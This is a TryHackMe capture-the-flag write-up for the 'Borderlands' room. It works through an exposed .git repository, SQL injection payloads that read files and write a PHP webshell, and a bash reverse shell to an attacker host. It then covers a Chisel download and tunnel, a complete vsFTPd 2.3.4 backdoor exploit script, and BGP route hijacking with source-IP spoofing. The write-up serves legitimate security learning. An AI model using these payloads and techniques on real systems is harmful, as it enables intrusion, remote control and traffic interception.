---
title: 'Borderlands'
target: 'TryHackMe — Borderlands'
difficulty: 'hard'
date: 2026-08-27
summary: 'A five-phase chain from an exposed .git repo through SQL injection, Chisel pivoting and a vsFTPd backdoor into BGP route hijacking — impersonating a trusted host to intercept flags across isolated subnets.'
role: 'pentest'
tags: ['Git dumping', 'SQL injection', 'Webshell', 'Chisel', 'SOCKS proxy', 'vsFTPd 2.3.4', 'CVE-2011-2523', 'BGP hijacking', 'Quagga', 'Vigenere cipher', 'Network pivoting', 'Docker']
problem: 'A multi-container Docker environment behind a single web server. The attack surface is wide but not obvious — the real target is an internal BGP routing infrastructure reachable only through pivoting, where intercepting flags requires hijacking routes between isolated subnets.'
action: 'Dumped an exposed .git repo to recover API keys and source code, exploited SQL injection for file read and webshell write, pivoted through Chisel into the internal network, popped a router via the vsFTPd 2.3.4 backdoor, then hijacked BGP advertisements to impersonate the flag client and intercept both UDP and TCP flags.'
outcome: 'Root on the BGP router, full route control over the internal topology, and all flags captured — webapp, router, UDP and TCP.'
draft: false
---

Borderlands is one of those rooms that chains five completely different
disciplines into one engagement: web exploitation, network pivoting, binary
exploitation, routing protocol manipulation, and traffic interception. Each
phase hands you exactly what you need for the next, and the endgame — BGP
hijacking to intercept traffic between two subnets you don't control — is
unlike anything in the typical TryHackMe catalogue. It took patience and a lot
of reading Quagga documentation.

## Reconnaissance

A fast Nmap scan with default scripts against the target reveals only two open
ports, but the script output says everything:

```bash
nmap -Pn -sC -F <TARGET_IP>
```

```
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
| http-git:
|   <TARGET_IP>:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository
|_    Last commit message: added mobile apk for beta testing.
8080/tcp closed http-proxy
```

Nmap's `http-git` script firing means the `.git` directory is browsable over
HTTP — the entire repository history can be reconstructed locally. A Gobuster
scan confirms and uncovers the rest:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster results showing .git/HEAD, index.php and info.php](/writeups/thm-borderlands/01-gobuster-dir.png)

Three things worth noting: `.git/HEAD` responds 200 (confirming the repo
exposure), `info.php` serves a full `phpinfo()` output (PHP version, loaded
modules, server config — significant information disclosure), and `index.php`
presents a login page with downloadable PDFs and a mobile APK link.

### Dumping the repository

With directory listing disabled on `.git/` but individual object files
accessible, `git-dumper` reconstructs the full repository by crawling known
object paths:

```bash
python git_dumper.py http://<TARGET_IP>/.git/ ./git-dump
cd git-dump
git log --oneline
```

```
6db3cf7  added mobile apk for beta testing
fee5595  added white paper pdfs
04f1f41  added theme
b2f776a  removed sensitive data
79c9539  added basic prototype of api gateway
93bab0a  added under construction page
152b2d9  created repo
```

![git-dumper fetching repository objects and refs](/writeups/thm-borderlands/02-git-dumper.png)

The commit message `removed sensitive data` on `b2f776a` is the key. In
practice, removing credentials from a git repository does not erase them — they
remain permanently accessible in the commit history. This is the single most
common mistake with git and secrets, and this room makes you exploit it
directly.

## API key recovery

### Git history analysis

Inspecting the diff of commit `b2f776a` reveals the API key validation logic
that was "removed." Three keys gate the API — prefixed `WEB*`, `AND*`, and
`GIT*`. The validation checks the first 20 characters of each key:

```bash
git show b2f776a
git show 79c9539
```

The original commit `79c9539` contains the full `GIT*` key before it was
truncated. The `home.php` file recovered from the dump contains the full `WEB*`
key embedded in a hardcoded API path. The `functions.php` file yields database
credentials — username `root`, a password, and a bcrypt salt in a commented-out
hash test. Two of the three keys are now in hand.

### APK reverse engineering — Vigenere cipher

The `AND*` key doesn't appear in plaintext anywhere in the git history. The hint
is in the mobile APK. After decompiling with `apktool`, the
`res/values/strings.xml` file contains an encrypted API key string:

```bash
apktool d mobile-app-prototype.apk -o mobile-app-prototype
cat mobile-app-prototype/res/values/strings.xml
```

```
<string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>
```

Inspecting `Main2Activity.smali` reveals a `decrypt()` function that accepts
this string and an encryption key — but the key is hardcoded as `#TODO` and the
function returns `NOT_IMPLEMENTED`. The developer left a placeholder and never
finished it.

The cipher can still be reversed manually. Comparing the encrypted string
against the known 20-character prefix of the `AND*` key from the git diff
reveals the fingerprint of a Vigenere cipher: non-alphabetic characters
(digits) appear at the same positions in both strings, untouched. The cipher
only rotates alpha characters.

With known plaintext and ciphertext, the key is recovered by computing the
per-character shift at each alphabetic position. The key index must increment
only on alphabetic characters — incrementing on digits produces the wrong key:

```python
python3 -c "
enc = 'CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo'
key = 'CONTEXT'
result = ''
ki = 0
for c in enc:
    if c.isalpha():
        base = ord('A') if c.isupper() else ord('a')
        k = ord(key[ki % len(key)]) - ord('A')
        result += chr((ord(c) - base - k) % 26 + base)
        ki += 1
    else:
        result += c
print(result)
"
```

![Python one-liner decrypting the Vigenere cipher with the CONTEXT key](/writeups/thm-borderlands/03-vigenere-decrypt.png)

The repeating key fragment resolves to `CONTEXT` — the name of Context
Information Security, the challenge author's company. With all three API keys
recovered, the API endpoint is accessible.

## Initial access

### SQL injection

The recovered `functions.php` source reveals that `GetDocumentDetails()`
constructs its SQL query through direct string concatenation with no
parameterization:

```php
$sql = "select documentid, documentname, location from documents where documentid=".$documentid;
```

The `documentid` parameter goes straight from the GET request into the query. A
UNION-based injection using `LOAD_FILE()` reads arbitrary files from the
filesystem — the database runs as root and has the `FILE` privilege:

```bash
curl "http://<TARGET_IP>/api.php?apikey=<API_KEY>&documentid=1"
```

```
Document ID: 1
Document Name: Context_Red_Teaming_Guide.pdf
Document Location: Context_Red_Teaming_Guide.pdf
```

Reading the webapp flag via `LOAD_FILE`:

```bash
curl -g "http://<TARGET_IP>/api.php?apikey=<API_KEY>&documentid=0%20UNION%20SELECT%201%2C2%2CLOAD_FILE('/var/www/flag.txt')--%20-"
```

The webapp flag was retrieved from `/var/www/flag.txt`.

### Webshell and reverse shell

The same injection path supports `INTO OUTFILE`, which writes arbitrary content
to the filesystem. A one-liner PHP webshell written into the web root:

```bash
curl -g "http://<TARGET_IP>/api.php?apikey=<API_KEY>&documentid=0%20UNION%20SELECT%201%2C2%2C'%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%3F%3E'%20INTO%20OUTFILE%20'/var/www/html/shell.php'--%20-"
```

Confirming execution:

```bash
curl "http://<TARGET_IP>/shell.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

With code execution confirmed, a bash reverse shell through the webshell, then
stabilized to a full PTY:

```bash
nc -lvnp 4444
```

```bash
curl "http://<TARGET_IP>/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'"
```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Inspecting the network configuration reveals the app container is dual-homed —
connected to both the Docker management network (`172.18.0.2/16` on `eth0`) and
an isolated internal network (`172.16.1.10/24` on `eth1`). That second interface
is the way in.

## Network pivoting

### Internal network discovery

With only Python3 available on the target — no `nmap`, no `nc`, no `ping` — a
custom TCP sweep identifies live hosts on the `172.16.1.0/24` subnet. The port
list includes common services plus Quagga-specific management ports:

```python
python3 -c "
import socket
for i in range(1, 255):
    ip = '172.16.1.' + str(i)
    if ip == '172.16.1.10':
        continue
    open_ports = []
    for port in [21, 22, 80, 179, 2601, 2605]:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((ip, port))
            open_ports.append(port)
            s.close()
        except:
            pass
    if open_ports:
        print('UP: ' + ip + ' ports: ' + str(open_ports))
"
```

```
UP: 172.16.1.128 ports: [21, 179, 2601, 2605]
```

Port 21 is FTP, 179 is BGP, and 2601/2605 are the Zebra and bgpd management
daemons from the Quagga routing suite. This is a router. Grabbing the FTP
banner confirms the version: **vsFTPd 2.3.4**.

### Chisel SOCKS tunnel

To run tools from Kali against the internal network, a Chisel reverse SOCKS5
proxy is established. Since `curl` isn't available on the target, the binary is
transferred using Python's `urllib`:

On Kali:

```bash
python3 -m http.server 8000
./chisel server -p 9999 --reverse
```

On the target:

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<ATTACKER_IP>:8000/chisel','/tmp/chisel')"
chmod +x /tmp/chisel
/tmp/chisel client <ATTACKER_IP>:9999 R:1080:socks
```

Once `session#1` appears on the Kali server, proxychains routes traffic through
the tunnel:

```bash
sudo sed -i 's/socks.*/socks5 127.0.0.1 1080/' /etc/proxychains.conf
```

## Router exploitation

### vsFTPd 2.3.4 backdoor (CVE-2011-2523)

vsFTPd 2.3.4 contains one of the most well-known backdoors in CTF history: a
supply chain compromise of the upstream source tarball in 2011. Sending a
username containing `:)` triggers a root bind shell on TCP port 6200. The
standard exploit script uses `telnetlib`, which was removed from Python 3.13, so
a custom implementation with raw sockets avoids that dependency:

```python
import socket, time, sys, threading

host = sys.argv[1]
s = socket.socket()
s.settimeout(5)
s.connect((host, 21))
s.recv(1024)
s.send(b"USER backdoor:)\r\n")
s.recv(1024)
s.send(b"PASS pass\r\n")
time.sleep(2)
s.close()

time.sleep(1)
s2 = socket.socket()
s2.connect((host, 6200))
print("[+] Got root shell!")

def recv_loop():
    while True:
        try:
            data = s2.recv(4096)
            if data:
                sys.stdout.write(data.decode(errors='ignore'))
                sys.stdout.flush()
        except:
            break

threading.Thread(target=recv_loop, daemon=True).start()

while True:
    try:
        cmd = input()
        s2.send((cmd + '\n').encode())
    except KeyboardInterrupt:
        break
```

Running through proxychains delivers root on router1:

```bash
proxychains python3 vsftpd_fixed.py 172.16.1.128
```

```
[+] Got root shell!
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

The router1 flag was retrieved from `/var/www/flag.txt`.

## BGP hijacking

### Network topology

With root on router1, the full picture becomes clear. The routing table and
Quagga configuration files reveal a three-router BGP topology:

```
                   +------------------+
                   |   Web App (APP)  |
                   |  172.16.1.10     |
                   +------------------+
                            |  172.16.1.0/24
                   +------------------+
                   |    ROUTER 1      |  AS 60001
                   |  172.16.1.128    |
                   +------------------+
                  /                    \
        172.16.12.0/24          172.16.31.0/24
               /                          \
    +------------------+          +------------------+
    |    ROUTER 2      | AS 60002 |    ROUTER 3      | AS 60003
    | 172.16.12.102    |          | 172.16.31.103    |
    +------------------+          +------------------+
              |                              |
       172.16.2.0/24                  172.16.3.0/24
              |                              |
    +------------------+          +------------------+
    |  flag_client      |          |  flag_server     |
    |  172.16.2.10     |          |  172.16.3.10     |
    | (sends UDP:4444) |          | (listens TCP:5555)|
    +------------------+          +------------------+
```

The flag client at `172.16.2.10` periodically sends UDP packets containing the
UDP flag to port 4444. The flag server at `172.16.3.10` listens on TCP port 5555
and sends the TCP flag to any client connecting from a trusted address — specifically
from the `172.16.2.x` space.

The attack plan: advertise a more specific route for `172.16.2.0/24` through
Router1's BGP daemon, bind `172.16.2.10` as a local IP on Router1, and become
the BGP-preferred destination for traffic destined to the flag client's network.

### Zebra and bgpd configuration

The Quagga configuration files on router1 disclose both daemon passwords. The
bgpd config confirms the two BGP neighbors:

```
neighbor 172.16.12.102 remote-as 60002   # Router2 (flag_client network)
neighbor 172.16.31.103 remote-as 60003   # Router3 (flag_server network)
```

### IP impersonation via Zebra

The Zebra daemon manages the kernel routing table and interface addresses.
Connecting to it on port 2601 and assigning `172.16.2.10/32` to the `eth0`
interface makes Router1 respond to traffic destined for that IP — effectively
impersonating the flag client:

```bash
vtysh
configure terminal
interface eth0
ip address 172.16.2.0/24
ip address 172.16.2.10/32
exit
```

### BGP advertisement via bgpd

With the IP addresses bound locally, bgpd must be told to advertise
`172.16.2.0/24` to its neighbors. This causes Router3 to update its routing
table and prefer Router1 as the next hop for that subnet, since Router1
originates the route with a lower AS path:

```bash
vtysh
configure terminal
router bgp 60001
network 172.16.2.0/25
network 172.16.3.0/25
end
clear ip bgp *
exit
```

![vsFTPd backdoor exploitation through proxychains, then vtysh BGP configuration on Router1](/writeups/thm-borderlands/04-vsftpd-bgp-vtysh.png)

After clearing the BGP sessions, the new routes propagate to all neighbors.
Static routes are also added to ensure the kernel forwards correctly:

```bash
ip route add 172.16.2.0/25 via 172.16.1.10
ip route add 172.16.3.0/25 via 172.16.1.10
```

## Flag interception

### UDP flag

UDP interception is passive — because UDP is stateless, simply being the
BGP-preferred destination for `172.16.2.10` is sufficient. Listening on port
4444 receives the flag within approximately 30 seconds of BGP convergence:

```bash
nc -luvnp 4444
```

![UDP flag received from the flag server via nc listener](/writeups/thm-borderlands/05-udp-flag.png)

The UDP flag was retrieved.

### TCP flag

TCP is more demanding. The flag server at `172.16.3.10:5555` doesn't push the
flag unsolicited — it waits for an inbound connection from a trusted source and
responds with "Connection from untrusted host" to connections from unknown IPs.
Since Router1 now owns `172.16.2.10` as a local address, it can initiate a
connection using that address as the source IP. The `nc -s` flag specifies the
local source address:

```bash
nc -s 172.16.2.10 172.16.3.10 5555
```

![TCP flag received after connecting with the impersonated source IP](/writeups/thm-borderlands/06-tcp-flag.png)

The TCP flag was retrieved. The flag server delivered it immediately upon
receiving a connection from the trusted `172.16.2.10` address.

## What I took from this

Borderlands taught me more about networking than any other room on the platform.
The web exploitation and pivoting phases are standard CTF fare — exposed git
repo, SQLi to shell, Chisel tunnel — but the BGP hijacking endgame is
genuinely different. Understanding why a more-specific route advertisement wins
over an existing one, why `clear ip bgp *` is necessary for convergence, and why
UDP interception is trivially passive while TCP requires source-IP
impersonation through the three-way handshake — that's the kind of knowledge
that doesn't come from just reading about BGP.

The Vigenere cipher recovery was a smaller but satisfying puzzle. The key
insight was noticing that digits passed through unchanged — the fingerprint
that identifies the cipher and tells you the key index must only increment on
alpha characters. Without that detail, the decryption script produces garbage
and you waste time thinking the cipher is something else entirely.

The chain of trust is also worth reflecting on: the flag server authenticates
clients by source IP alone, which holds only as long as the routing
infrastructure is trustworthy. Once one router falls, the entire trust model
collapses — source IP becomes whatever the attacker wants it to be. It's the
same lesson as certificate pinning vs. trusting the network: authentication
that depends on infrastructure the attacker can compromise isn't authentication
at all.
